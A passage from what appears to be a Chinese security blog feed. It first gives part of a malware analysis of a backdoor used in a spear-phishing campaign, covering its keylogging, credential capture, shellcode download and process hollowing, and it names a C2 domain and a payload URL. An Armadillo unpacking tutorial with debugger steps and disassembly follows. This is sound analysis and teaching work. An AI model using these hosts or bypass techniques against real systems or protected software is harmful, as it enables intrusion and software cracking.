src="http://hacky.wang/blog/20190530/7F5srRvuzn0v.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/CGxKazGvJTT3.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建新线程，执行截图<br>    <img src="http://hacky.wang/blog/20190530/yR8IoRHbpfTh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/bwfBwvH3izqg.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/NqOv2wDPzsuM.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/MJ2nzNziucMo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建新线程进行音视频传输<br>    <img src="http://hacky.wang/blog/20190530/NBjXKoTsQtxs.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;清空主流浏览器的COOKIE和保存的表单(账户和密码)，这样就可以在用户重新输入密码的时候记录下来。<br>    <img src="http://hacky.wang/blog/20190530/HCE8Qibkbqgn.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/htwCe5roCz9E.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取用户名，机器名称，主要是识别作用<br>    <img src="http://hacky.wang/blog/20190530/eBifkMoWRjBW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关闭数据执行保护DEP<br>    <img src="http://hacky.wang/blog/20190530/Bfkpo0S2QVE4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行后门远控操作，主要的行为有键盘记录，截图，视频，发送数据，联网下载数据，检索服务，创建开启服务，程序执行，傀儡进程，提权关机。</p><ul><li>提权关机<br>  <img src="http://hacky.wang/blog/20190530/FFjpLz4J43FX.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/pYLAhPk3gBQf.png?imageslim" alt="mark"></li><li>键盘记录<br>  <img src="http://hacky.wang/blog/20190530/mhIdck9OnGao.png?imageslim" alt="mark"></li><li>发送键盘输入数据<br>  <img src="http://hacky.wang/blog/20190530/oOK0pcOh4ihn.png?imageslim" alt="mark"></li><li>安装软件信息，并发送<br>  <img src="http://hacky.wang/blog/20190530/xTgtjda9jv14.png?imageslim" alt="mark"></li><li>从Internet上读取可执行的shellcode，并执行<br>  <img src="http://hacky.wang/blog/20190530/RY3FfWB9h30L.png?imageslim" alt="mark"></li><li>获取进程列表<br>  <img src="http://hacky.wang/blog/20190530/UIiP1XJeuXdw.png?imageslim" alt="mark"></li><li>利用管道实现和C2之间的数据交互<br>  <img src="http://hacky.wang/blog/20190530/ECdPKzU9Lxt9.png?imageslim" alt="mark"></li><li>截图<br>  <img src="http://hacky.wang/blog/20190530/X1nCzCbVrg03.png?imageslim" alt="mark"></li><li>键盘区域<br>  <img src="http://hacky.wang/blog/20190530/wtWgKpNdbMpJ.png?imageslim" alt="mark"></li><li>删除，清空文件<br>  <img src="http://hacky.wang/blog/20190530/BDFdEqEMSBTB.png?imageslim" alt="mark"></li><li>清空COOKIE和用户名密码<br>  <img src="http://hacky.wang/blog/20190530/vgx2dLTQ52uX.png?imageslim" alt="mark"></li><li>音视频<br>  <img src="http://hacky.wang/blog/20190530/HxEReejnTbhM.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/weGL22cJNAxS.png?imageslim" alt="mark"></li><li>从Internet上下载数据并执行<br>  <img src="http://hacky.wang/blog/20190530/MD6BA3jtt83K.png?imageslim" alt="mark"></li><li>获取服务相关信息<br>  <img src="http://hacky.wang/blog/20190530/7bKJHwCaBzoO.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;综上，对此样本定性为<strong>后门远控类文件</strong>。</p><h2 id="0x4-4-298eeexe-exe"><a href="#0x4-4-298eeexe-exe" class="headerlink" title="0x4.4 298eeexe.exe"></a>0x4.4 298eeexe.exe</h2><ul><li>从<a href="http://www.gestomarket.co/hqpi64.exe下载文件，并执行" target="_blank" rel="external">http://www.gestomarket.co/hqpi64.exe下载文件，并执行</a><br>  <img src="http://hacky.wang/blog/20190530/CxyVqwMOJysO.png?imageslim" alt="mark"></li></ul><h2 id="0x4-5-2XC2DF0S-exe"><a href="#0x4-5-2XC2DF0S-exe" class="headerlink" title="0x4.5 2XC2DF0S.exe"></a>0x4.5 2XC2DF0S.exe</h2><ul><li>SHA256为2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47，查壳是UPX的壳，ESP拖一下.<br>  <img src="http://hacky.wang/blog/20190530/2OIjOJJO2bjn.png?imageslim" alt="mark"></li><li>主要使用了SMC技术<br>  <img src="http://hacky.wang/blog/20190530/tDqH0qJrmyse.png?imageslim" alt="mark"></li><li><p>根据动态分析，可以得到样本创建了fyhgzmilgyvvgdu.exe和\「开始」菜单\程序\启动\创建fyhgzmilgyvvgdu.eu.url。创建url的目的是实现了fyhgzmilgyvvgdu.exe的自启动<br>  <img src="http://hacky.wang/blog/20190530/izfY42GDjtxG.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/PbEFY4NVxBxL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/WARLNynOQVC7.png?imageslim" alt="mark"></p></li><li><p>创建自身子进程，并进行进程替换<br>  <img src="http://hacky.wang/blog/20190530/RTpRqfT9lrz4.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/v1XfIa4p0EgQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/Ar9bAD4GBcwQ.png?imageslim" alt="mark"></p></li><li>dump出傀儡进程的PE数据，命名为DumpFrom2d69exe.exe_<br>  <img src="http://hacky.wang/blog/20190530/XBHWFk2lgFEr.png?imageslim" alt="mark"></li></ul><h2 id="0x4-6-DumpFrom2d69exe-exe"><a href="#0x4-6-DumpFrom2d69exe-exe" class="headerlink" title="0x4.6 DumpFrom2d69exe.exe_"></a>0x4.6 DumpFrom2d69exe.exe_</h2><ul><li>首先样本会先链接到C2服务器<code>asdfwrkhl.warzonedns.com</code>，当确认链接上<code>asdfwrkhl.warzonedns.com</code>,此时会从C2上接收数据<br>  <img src="http://hacky.wang/blog/20190531/JnFcBdvpEuNj.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/LuJRzBbnOqD9.png?imageslim" alt="mark"></li><li>然后将自身路径写入SOFTWARE\_rptls注册表中，但是注意的是这个是从2XC2DF0S.exe转储出来的，所以原始的模块名应该是2XC2DF0S.exe。加载资源文件，然后有个函数是解密shellcode，然后在把加载入内存的资源文件作为参数传入，初步怀疑应该从内存中执行。这样有效避免了查杀。将资源文件命名为Resource.bin<br>  <img src="http://hacky.wang/blog/20190531/Np5Pu9zW5rXd.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/0LCl60fJ1Om7.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/wsmMrrrwPYBU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/wm7wdh5PKRs9.png?imageslim" alt="mark"></li><li>直接就是一个后门程序的主体框架。主要包括三大类的功能，第一交流通信，第二，下载执行，第三，信息记录，第四，测试退出，第五驻留操作。<br>  <img src="http://hacky.wang/blog/20190531/3VhJKujgaWxF.png?imageslim" alt="mark"></li><li>第一：通信交流<br>  <img src="http://hacky.wang/blog/20190531/3zNC6Iv8TbyU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/jHs9TptLnXU1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/zoLRanmKhcXJ.png?imageslim" alt="mark"></li><li>第二：下载执行，但是由于分析的时候，没有处于攻击窗口期，所以没有办法了解到此次下载的是何种程序，然后加载了一些网络库，运行时库<br>  <img src="http://hacky.wang/blog/20190531/7GeLBDmIARA1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/A2sUFO3xp63G.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/SzfW0vNHmgMX.png?imageslim" alt="mark"></li><li>第三：信息记录，主要是键盘记录，和常见的手段一样，使用了钩子技术，截获用户的键盘输入，并记录按键信息，把并发送个C2服务器<br>  <img src="http://hacky.wang/blog/20190531/bjEvbMaP086q.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/SPgBynQXWoWV.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/oezl9Ao1Mxjq.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/ia62OMkAyqt1.png?imageslim" alt="mark"></li><li><p>第四：结束退出，也就是，断开连接，终止线程，删除自身<br>  <img src="http://hacky.wang/blog/20190531/PYQS3fKxCVvl.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/9JBlteNf771m.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/t0Vcy7E3vTn3.png?imageslim" alt="mark"></p></li><li><p>第五：驻留操作。包含了释放资源，运行服务，添加用户等<br>  <img src="http://hacky.wang/blog/20190531/XTmksNUFolcU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/ov8jtKnIDlq1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/FhlkNdjSbCpI.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/T7fbWQtCDoet.png?imageslim" alt="mark"></p></li></ul><h2 id="0x4-7-Resource-bin"><a href="#0x4-7-Resource-bin" class="headerlink" title="0x4.7 Resource.bin"></a>0x4.7 Resource.bin</h2><ul><li>释放<code>C:\Users\hacky\AppData\Local\Temp\dismcore.dll</code>和<code>C:\Users\hacky\AppData\Local\Temp\ellocnak.xml</code><br>  <img src="http://hacky.wang/blog/20190531/OXR5A7GOrBVQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/3ERiffs6sFkT.png?imageslim" alt="mark"></li><li>然后调用C:\Windows\system32\pkgmgr.exe，安装安装KB929761更新包，可能目的是排除竞争者<br>  <img src="http://hacky.wang/blog/20190531/KXFIlim7xvcJ.png?imageslim" alt="mark"></li></ul><h2 id="0x4-8-dismcore-dll"><a href="#0x4-8-dismcore-dll" class="headerlink" title="0x4.8 dismcore.dll"></a>0x4.8 dismcore.dll</h2><ul><li>读取SOFTWARE\_rptls的值，这个是其实是2XC2DF0S.exe的路径，然后截取去文件名。检查进程列表中是否存在这样的进程，有则关闭，然后在重新创建一个进程即可！<br>  <img src="http://hacky.wang/blog/20190531/MCoNO1kE6J0A.png?imageslim" alt="mark"></li></ul><h1 id="0x5-yara规则编写"><a href="#0x5-yara规则编写" class="headerlink" title="0x5 yara规则编写"></a>0x5 yara规则编写</h1><ul><li>   <img src="http://hacky.wang/blog/20190601/YxECxIiG24Nw.png?imageslim" alt="mark"><h1 id="0x6-后记"><a href="#0x6-后记" class="headerlink" title="0x6 后记"></a>0x6 后记</h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习样本分析两年了，从最开始的简单的蠕虫到后来的勒索病毒，再到挖矿病毒，再到现在的APT样本。总结一下，样本分析最重要的是心细和心诚。心细不多说。何谓心诚，心诚则灵。对于样本，我们也需要有敬畏之心，需要刨根问题，也就是说，作为一个合格的病毒分析师，首先你需要判断文件黑白，但能够辨别黑白也只能给你打60分。如何成为一个优秀的病毒分析师?在于刨根问底，在于洞悉原理，不是简单的知道样本执行了什么操作。肉眼看到的仅仅都只是表面现象。就像这个样本那个宏一样，肉眼可见其实释放了一个exe，但是他是怎么释放的呢？你一概不知，这样你可能就失去了一个可靠的情报，或者说你很有可能凭借这过于自信的判断。导致<strong>你对这样本的判断是错误的.</strong>但是这对于用户来说是致命的。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;专科学技术，本科学原理，博硕学辩证。对之于样本分析同，仅仅是懂得辩黑白仅仅就是专科的水平，不屑于言之，若能明晓原理，可达登堂入室之功，最后是辩证，也就是知道为何这样做是可行的，这样做是不可行的，不可行之处在于何处。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3千多个网站服务器，并高调的在被攻击网站上留下其组织的名称，随后消失了多年。 如今通过研究人员的追踪再次挖出该黑客组织的活动迹象。此次攻击活动通过构造恶意Office Word文档并配合鱼叉邮件发起定向攻击，以“简历更新”作为诱饵文档向攻击目标植入间谍木马，从事情报收集、远控监视及系统破坏等恶意行动。在本次攻击过程中，该组织采用渗透手段攻下多台服务器并将其作为存放攻击代码的跳板。[转]&lt;br&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>一篇文章带你学会Armadillo脱壳</title>
    <link href="https://findream.github.io/2019/05/03/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E5%AD%A6%E4%BC%9AArmadillo%E8%84%B1%E5%A3%B3/"/>
    <id>https://findream.github.io/2019/05/03/一篇文章带你学会Armadillo脱壳/</id>
    <published>2019-05-03T07:02:11.000Z</published>
    <updated>2019-07-01T07:41:01.181Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近在跟进一个APT组织的一次攻击，其中有一个样本使用了Arm加壳，所以花了差不多10多天的时间看看这方面的东西。并总结一下。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章主要参考了FLY和刹那恍惚两位大佬的文章。和录制的视频。以及jcyhlh大侠在2008年写下的总结帖。那时候我估计还在玩泥巴呢。这是我写这篇文章的主要参考来源。前人栽树后人乘凉。此外还看了<strong>看雪的知识库</strong>。基本看了3.x和4.x所有师傅的文章。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章的架构，文章架构主要参照了网上下载的视频教程的架构。并对此作出小小修改和注释以及归纳总结。更加方便我等小白学习成长。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于文章主要脱去的是3.x和4.x的Arm，可能有一些<strong>伪大佬</strong>又要说都发了几百遍了还在发。这篇文章适合我等小白，所以伪大佬勿扰。真大佬可以daidaiwo。<strong>对此我的处理意见是，把其直接挂在文章起始部分</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，加油吧，小伙伴们。<br><a id="more"></a></p><h2 id="0x1-Armadillo"><a href="#0x1-Armadillo" class="headerlink" title="0x1 Armadillo"></a>0x1 Armadillo</h2><h3 id="0x1-1-保护机制"><a href="#0x1-1-保护机制" class="headerlink" title="0x1.1 保护机制"></a>0x1.1 保护机制</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Armadillo，中文名穿山甲，本意为犰狳，就是下面那个有点可爱的家伙。<br>    <img src="https://i.loli.net/2019/05/02/5ccaefb30fa36.jpg" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Armadillo主要采用了Debug-Blocker，CopyMem-II， Enable Import Table Elimination，Enable Nanomites Processing，Enable Memory-Patching Protections保护手段。同时也有单双进程之分，造成了保护手段的多样性。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Debug-Blocker，称为阻止调试器，所谓反调试，基本只要开插件都可以过，所以这也是为什么大家脱穿山甲的时候打开IsProcessDebug去反调试选项和忽略异常的原因。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CopyMem-II：双进程保护，最常使用的是<code>bp OpenMutexA</code>,然后转到401000 patch代码。另外一种是修改相反跳转的方法。(脚本方法就是不说了)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enable Import Table Elimination：IAT保护，修改Magic_Jmp。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enable Nanomites Processing就是CC保护，也是Armadillo最强大的保护机制。原理就是就是将程序中的部分代码改写为int3或者向其中插入int3代码。</p><h3 id="0x1-2-前期侦壳"><a href="#0x1-2-前期侦壳" class="headerlink" title="0x1.2 前期侦壳"></a>0x1.2 前期侦壳</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;知己知彼百战不殆，在脱壳最重要的就是侦壳。这里需要使用到的工具主要有：PEID(不推荐)，exepeinfo，ArmaFP，任务管理器。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中，exepeinfo是用于查壳的，任务管理器是用于判断是单进程还是双进程，如果是双进程就需要双转单。ArmaFP是用于判断其保护模式，是标准模式，还是全保护模式(专业模式)。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不过关于壳的版本，exepeinfo容易误报，所以可以使用这个方法：OD载入程序，下<code>HE OutputDebugStringA</code>断点。shift+F9中断后，看堆栈如果出现如下的，就是4.0以上的壳。这是由于Arm在4.0利用Od在调式保护格式串的消息时会奔溃而新增的反调试技术。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//<span class="number">4.01</span></div><div class="line"><span class="number">0012</span>EC7<span class="number">0</span>   <span class="number">021</span>B580F  /CALL 到 OutputDebugStringA 来自 <span class="number">021</span>B5809</div><div class="line"><span class="number">0012</span>EC74   <span class="number">0012</span>F5E8  \String = <span class="string">"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"</span></div><div class="line">/<span class="number">3</span>.X</div><div class="line">//此时程序运行起来。</div></pre></td></tr></table></figure></p><h2 id="0x2-Armadillo单进程脱壳"><a href="#0x2-Armadillo单进程脱壳" class="headerlink" title="0x2 Armadillo单进程脱壳"></a>0x2 Armadillo单进程脱壳</h2><h3 id="0x2-1-标准单进程Armadillo-3-78-4-xx-脱壳"><a href="#0x2-1-标准单进程Armadillo-3-78-4-xx-脱壳" class="headerlink" title="0x2.1 标准单进程Armadillo 3.78 - 4.xx 脱壳"></a>0x2.1 标准单进程Armadillo 3.78 - 4.xx 脱壳</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是最简单的加密方法，只需要修改Magic_Jmp就可以了，因为这个版本单进程防护只是加密了IAT，(1)只需要绕过加密，(2)并让其解压压缩区段即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;绕过IAT加密的方法就是修改Magic_Jmp,这是脱穿山甲壳必须使用的方法。步骤如下：</p><ul><li>step1：在<code>GetModuleHandle</code>下硬件断点，可以<code>HE GetModuleHandle</code>或者<code>HE GetModuleHandle+5</code>。</li><li><p>Step2：然后Shift+F9,断下的时候，看堆栈窗口是否存在VirtualAlloc或者VirtualFree，只要出现这两个API函数，就表明快到了。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">000</span>C94C8  |<span class="number">00726</span>DF3  返回到 <span class="number">00726</span>DF3 来自 kernel32.GetModuleHandleA</div><div class="line"><span class="number">000</span>C94CC  |<span class="number">0073</span>BC1C  ASCII <span class="string">"kernel32.dll"</span></div><div class="line"><span class="number">000</span>C94D0  |<span class="number">0073</span>CEC4  ASCII <span class="string">"VirtualAlloc"</span></div><div class="line"><span class="number">000</span>C94D4  |<span class="number">0073</span>FA98</div><div class="line"><span class="number">000</span>C94D8  |<span class="number">77E22270</span>  ntdll.RtlLeaveCriticalSection</div></pre></td></tr></table></figure></li><li><p>Step3：继续Shift+F9，只要堆栈出现kernel32.dll，但是不包含任何其他函数名称，表示到达了返回的时机。此时<strong>执行到返回ctrl+F9</strong>。如何判断之前执行到返回的时机是否正确呢，就是看是否存在LoadLibrary这个API函数。此时就是正确的。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">000</span>C9228  /<span class="number">000</span>C94C8</div><div class="line"><span class="number">000</span>C922C  |<span class="number">00715</span>CE1  返回到 <span class="number">00715</span>CE1 来自 kernel32.GetModuleHandleA</div><div class="line"><span class="number">000</span>C9230  |<span class="number">000</span>C937C  ASCII <span class="string">"kernel32.dll"</span></div><div class="line"><span class="number">000</span>C9234  |<span class="number">000</span>CEAB4</div><div class="line"><span class="number">000</span>C9238  |<span class="number">3</span>CBC24B7</div></pre></td></tr></table></figure></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">00715CE1    8B0D AC407400   <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715CE7    89040E          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">ecx</span>], <span class="built_in">eax</span></div><div class="line">00715CEA    A1 AC407400     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715CEF    391C06          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">eax</span>], <span class="built_in">ebx</span></div><div class="line">00715CF2    <span class="number">75</span> <span class="number">16</span>           <span class="keyword">jnz</span>     short 00715D0A</div><div class="line">00715CF4    8D85 B4FEFFFF   <span class="keyword">lea</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-14C]</div><div class="line">00715CFA    <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">00715CFB    FF15 BC627300   <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [7362BC]               <span class="comment">; kernel32.LoadLibraryA</span></div><div class="line">00715D01    8B0D AC407400   <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715D07    89040E          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">ecx</span>], <span class="built_in">eax</span></div></pre></td></tr></table></figure><ul><li>此时就可以修改LoadLibrary函数下面的那个条件跳转(00715D12)为jmp，跳转到00425E5C,然后撤销之前的修改。<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">00715CF4    8D85 B4FEFFFF   <span class="keyword">lea</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-14C]</div><div class="line">00715CFA    <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">00715CFB    FF15 BC627300   <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [7362BC]               <span class="comment">; kernel32.LoadLibraryA</span></div><div class="line">00715D01    8B0D AC407400   <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715D07    89040E          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">ecx</span>], <span class="built_in">eax</span></div><div class="line">00715D0A    A1 AC407400     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715D0F    391C06          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">eax</span>], <span class="built_in">ebx</span></div><div class="line">00715D12  - 0F84 2F010090   <span class="keyword">je</span>      90715E47</div></pre></td></tr></table></figure></li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">00425E53</span>    <span class="number">395</span>F FC         cmp     dword ptr [edi<span class="number">-4</span>], ebx</div><div class="line"><span class="number">00425E56</span>  ^ <span class="number">0</span>F85 <span class="number">49</span>FEFFFF   jnz     <span class="number">00425</span>CA5</div><div class="line"><span class="number">00425E5</span>C    EB <span class="number">03</span>           jmp     short <span class="number">00425E61</span></div><div class="line"><span class="number">00425E5</span>E    D6              salc</div></pre></td></tr></table></figure><ul><li>Step4：因为外壳肯定需要将存储在某一区段的数据解压到text段，需要对该段进行访问，所以，在内存窗口的程序的text段下访问断点。然后shift+F9。中断在43468F,然后单步，在此代码段的最后一个<code>call ecx</code>处步入就是OEP。<br>  <img src="https://i.loli.net/2019/04/26/5cc3183998afa.png" alt=""><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0043F68F    8B12            <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>]</div><div class="line">0043F691    <span class="number">8955</span> DC         <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">24</span>], <span class="built_in">edx</span></div><div class="line">0043F694    <span class="number">834D</span> FC FF      <span class="keyword">or</span>      <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], FFFFFFFF</div><div class="line">0043F698    EB <span class="number">11</span>           <span class="keyword">jmp</span>     short 0043F6AB</div><div class="line">0043F69A    6A <span class="number">01</span>           <span class="keyword">push</span>    <span class="number">1</span></div></pre></td></tr></table></figure></li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="number">0100739D</span>    6A <span class="number">70</span>           <span class="built_in">push</span>    <span class="number">70</span></div><div class="line"><span class="number">0100739F</span>    <span class="number">68</span> <span class="number">98180001</span>     <span class="built_in">push</span>    <span class="number">01001898</span></div><div class="line"><span class="number">010073A4</span>    E8 BF010000     call    <span class="number">01007568</span></div><div class="line"><span class="number">010073A9</span>    33DB            xor     ebx, ebx</div><div class="line"><span class="number">010073AB</span>    <span class="number">53</span>              <span class="built_in">push</span>    ebx</div><div class="line"><span class="number">010073AC</span>    8B3D CC100001   mov     edi, dword ptr [10010CC]         ; kernel32.GetModuleHandleA</div><div class="line"><span class="number">010073B2</span>    FFD7            call    edi</div><div class="line"><span class="number">010073B4</span>    <span class="number">66</span>:<span class="number">8138</span> 4D5A    cmp     word ptr [eax], 5A4D</div><div class="line"><span class="number">010073B9</span>    <span class="number">75</span> 1F           jnz     short <span class="number">010073DA</span></div><div class="line"><span class="number">010073BB</span>    <span class="number">8B48</span> 3C         mov     ecx, dword ptr 